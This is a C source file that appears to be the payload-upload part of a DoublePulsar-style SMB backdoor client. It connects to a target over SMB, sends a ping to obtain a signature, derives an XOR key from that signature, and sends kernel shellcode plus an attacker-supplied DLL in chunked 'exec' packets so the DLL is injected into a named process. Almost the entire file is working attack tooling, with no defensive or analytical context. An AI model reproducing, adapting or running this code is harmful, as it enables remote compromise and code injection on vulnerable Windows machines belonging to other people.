#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    while (length != 0) {
        int amount = length > (size_t)INT_MAX ? INT_MAX : (int)length;
        int sent = send(sock, (const char *)buffer, amount, 0);
        if (sent == SOCKET_ERROR || sent == 0) {
            if (sent == SOCKET_ERROR && WSAGetLastError() == WSAEINTR) {
                continue;
            }
            return -1;
        }
        buffer += sent;
        length -= (size_t)sent;
    }
    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    while (length != 0) {
        int amount = length > (size_t)INT_MAX ? INT_MAX : (int)length;
        int received = recv(sock, (char *)buffer, amount, 0);
        if (received == SOCKET_ERROR || received == 0) {
            if (received == SOCKET_ERROR && WSAGetLastError() == WSAEINTR) {
                continue;
            }
            return -1;
        }
        buffer += received;
        length -= (size_t)received;
    }
    return 0;
}

static int upload_receive_packet(SOCKET sock, uint8_t **packet, size_t *packet_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    *packet = NULL;
    *packet_length = 0;
    if (upload_recv_all(sock, header, sizeof(header)) != 0) {
        return -1;
    }

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if ((size_t)body_length > SIZE_MAX - sizeof(header)) {
        return -1;
    }

    buffer = (uint8_t *)malloc(sizeof(header) + (size_t)body_length);
    if (buffer == NULL) {
        return -1;
    }
    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, buffer + sizeof(header), (size_t)body_length) != 0) {
        free(buffer);
        return -1;
    }

    *packet = buffer;
    *packet_length = sizeof(header) + (size_t)body_length;
    return 0;
}

static void upload_put_le16(uint8_t *buffer, uint16_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
}

static void upload_put_le32(uint8_t *buffer, uint32_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
    buffer[2] = (uint8_t)(value >> 16);
    buffer[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *packet = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t shellcode_size = (size_t)KERNEL_RUNDLL_SIZE;
    uint16_t user_id = 0;
    uint16_t tree_id = 0;
    uint32_t xor_key;
    uint32_t signature;
    uint32_t inject_hash = 0;
    struct sockaddr_in address;
    int result = -1;
    int wsa_started = 0;
    size_t i;
    const unsigned char *process_name;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535) {
        return -1;
    }

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX ||
        (uint64_t)file_size.QuadPart > UINT32_MAX) {
        goto cleanup;
    }
    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > UINT32_MAX - shellcode_size ||
        dll_size > SIZE_MAX - shellcode_size) {
        goto cleanup;
    }
    payload_size = shellcode_size + dll_size;
    if ((uint64_t)dll_size > UINT32_MAX - UINT64_C(3978)) {
        goto cleanup;
    }

    if (dll_size != 0) {
        dll = (uint8_t *)malloc(dll_size);
        if (dll == NULL) {
            goto cleanup;
        }
        {
            size_t remaining = dll_size;
            uint8_t *destination = dll;
            while (remaining != 0) {
                DWORD amount = remaining > (size_t)UINT32_MAX
                                   ? UINT32_MAX
                                   : (DWORD)remaining;
                DWORD bytes_read = 0;
                if (!ReadFile(file, destination, amount, &bytes_read, NULL) ||
                    bytes_read == 0) {
                    goto cleanup;
                }
                destination += bytes_read;
                remaining -= (size_t)bytes_read;
            }
        }
    }
    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    payload = (uint8_t *)malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL) {
        goto cleanup;
    }
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, shellcode_size);
    if (dll_size != 0) {
        memcpy(payload + shellcode_size, dll, dll_size);
    }
    upload_put_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET,
                    (uint32_t)dll_size + 3978U);
    upload_put_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_size);
    upload_put_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    process_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*process_name != '\0') {
        inject_hash = inject_hash * 127U + (uint32_t)*process_name++;
    }
    upload_put_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        goto cleanup;
    }
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        goto cleanup;
    }
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET ||
        connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
        goto cleanup;
    }

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0) {
        goto cleanup;
    }
    free(response);
    response = NULL;

    if (upload_send_all(sock, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0) {
        goto cleanup;
    }
    if (response_length < 34) {
        goto cleanup;
    }
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    packet = (uint8_t *)malloc(sizeof(SMB_TREE_CONNECT_PKT) - 1);
    if (packet == NULL) {
        goto cleanup;
    }
    memcpy(packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT) - 1);
    upload_put_le16(packet + 32, user_id);
    if (upload_send_all(sock, packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0) {
        goto cleanup;
    }
    if (response_length < 30) {
        goto cleanup;
    }
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;
    free(packet);
    packet = NULL;

    packet = (uint8_t *)malloc(sizeof(DP_PING_PKT) - 1);
    if (packet == NULL) {
        goto cleanup;
    }
    memcpy(packet, DP_PING_PKT, sizeof(DP_PING_PKT) - 1);
    upload_put_le16(packet + 28, tree_id);
    upload_put_le16(packet + 32, user_id);
    if (upload_send_all(sock, packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0) {
        goto cleanup;
    }
    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4) {
        goto cleanup;
    }
    signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    xor_key = (2U * signature) ^
              ((((signature >> 16) | (signature & 0x00FF0000U)) >> 8) |
               (((signature << 16) | (signature & 0x0000FF00U)) << 8));
    free(response);
    response = NULL;
    free(packet);
    packet = NULL;

    xor_buffer(payload, payload_size, xor_key);

    for (i = 0; i < payload_size; i += (size_t)SMB_EXEC_SHELLCODE_LEN) {
        size_t chunk_size = payload_size - i;
        size_t packet_length;
        uint32_t parameter_values[3];
        size_t j;

        if (chunk_size > (size_t)SMB_EXEC_SHELLCODE_LEN) {
            chunk_size = (size_t)SMB_EXEC_SHELLCODE_LEN;
        }
        if (chunk_size > UINT16_MAX || chunk_size > SIZE_MAX - 82) {
            goto cleanup;
        }
        packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12 + chunk_size;
        packet = (uint8_t *)malloc(packet_length);
        if (packet == NULL) {
            goto cleanup;
        }
        memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
        parameter_values[0] = (uint32_t)payload_size;
        parameter_values[1] = (uint32_t)chunk_size;
        parameter_values[2] = (uint32_t)i;
        for (j = 0; j < 3; ++j) {
            upload_put_le32(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + j * 4,
                            parameter_values[j]);
        }
        xor_buffer(packet + (size_t)SMB_EXEC_TEMPLATE_LEN, 12, xor_key);
        memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 12,
               payload + i, chunk_size);

        {
            uint32_t netbios_length =
                (uint32_t)(chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12 - 4);
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
        }
        upload_put_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk_size);
        upload_put_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk_size);
        upload_put_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET,
                        (uint16_t)(chunk_size + 12));
        upload_put_le16(packet + SMB_TID_OFFSET, tree_id);
        upload_put_le16(packet + SMB_UID_OFFSET, user_id);

        if (upload_send_all(sock, packet, packet_length) != 0 ||
            upload_receive_packet(sock, &response, &response_length) != 0) {
            goto cleanup;
        }
        free(packet);
        packet = NULL;

        if (i + chunk_size == payload_size) {
            if ((size_t)DP_RESP_MUX_ID_OFFSET >= response_length ||
                response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                goto cleanup;
            }
        }
        free(response);
        response = NULL;
    }

    result = 0;

cleanup:
    if (response != NULL) {
        free(response);
    }
    if (packet != NULL) {
        free(packet);
    }
    if (payload != NULL) {
        free(payload);
    }
    if (dll != NULL) {
        free(dll);
    }
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if (wsa_started) {
        WSACleanup();
    }
    return result;
}